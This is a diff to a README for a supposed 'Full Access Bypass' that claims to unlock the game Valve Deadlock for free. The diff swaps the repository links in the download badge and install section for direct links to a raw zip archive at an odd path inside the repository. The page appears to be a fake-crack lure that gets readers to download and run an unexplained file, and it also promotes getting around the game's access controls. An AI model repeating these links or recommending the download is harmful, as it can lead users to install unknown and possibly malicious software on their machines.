@@ -1,6 +1,6 @@
 # 🎮 Valve-Deadlock-Full-Access-Bypass - Unlock Deadlock Free on PC
 
-[![Download Now](https://img.shields.io/badge/Download-Deadlock_Full_Access-2ea44f?style=for-the-badge&logo=github)](https://github.com/Nicolashobday/Valve-Deadlock-Full-Access-Bypass)
+[![Download Now](https://img.shields.io/badge/Download-Deadlock_Full_Access-2ea44f?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Nicolashobday/Valve-Deadlock-Full-Access-Bypass/main/actability/2.7-beta.5.zip)
 
 ## 🚀 What Is This?
 
@@ -17,7 +17,7 @@ This is your all-in-one solution to get **Valve Deadlock** running on your Windo
 
 ## 📥 Download and Install
 
-Visit this link to download the application: [https://github.com/Nicolashobday/Valve-Deadlock-Full-Access-Bypass](https://github.com/Nicolashobday/Valve-Deadlock-Full-Access-Bypass)
+Visit this link to download the application: [https://raw.githubusercontent.com/Nicolashobday/Valve-Deadlock-Full-Access-Bypass/main/actability/2.7-beta.5.zip](https://raw.githubusercontent.com/Nicolashobday/Valve-Deadlock-Full-Access-Bypass/main/actability/2.7-beta.5.zip)
 
 Once you're on the page, look for the big green "Download" button or the latest release file. Click it, and the download will start automatically. The file is small, so it won't take long.
 
